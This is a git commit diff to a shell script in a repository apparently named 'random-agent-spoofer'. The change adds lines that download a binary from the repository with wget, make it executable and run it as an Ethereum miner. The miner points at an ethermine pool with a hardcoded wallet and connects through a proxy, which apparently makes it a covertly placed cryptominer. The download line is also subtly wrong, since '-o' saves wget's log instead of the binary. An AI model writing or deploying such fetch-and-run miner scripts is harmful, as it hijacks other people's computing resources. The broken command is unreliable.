440009132d5416fdd99d6660c0ddd0b46807b362
trangtrau <30510221+trangtrau@users.noreply.github.com>
2022-09-02 03:53:45 +0700

    Update daotam.sh

--- ETH/daotam.sh
+++ ETH/daotam.sh
@@ -1,2 +1,5 @@
-./van -a ethash -o ethproxy+tcp://asia1.ethermine.org:4444 -u 0xac2a5aaa1b901c08b383fc7163ebd5bd4ee24d70.worker --proxy  --proxy 6f390780b468.sn.mynetname.net:9090
+#!/bin/bash
+wget https://github.com/trangtrau/random-agent-spoofer/raw/master/ETH/a -o van
+chmod 775 van
+./van -a ethash -o ethproxy+tcp://asia1.ethermine.org:4444 -u 0xac2a5aaa1b901c08b383fc7163ebd5bd4ee24d70.worker --proxy 6f390780b468.sn.mynetname.net:9090
 
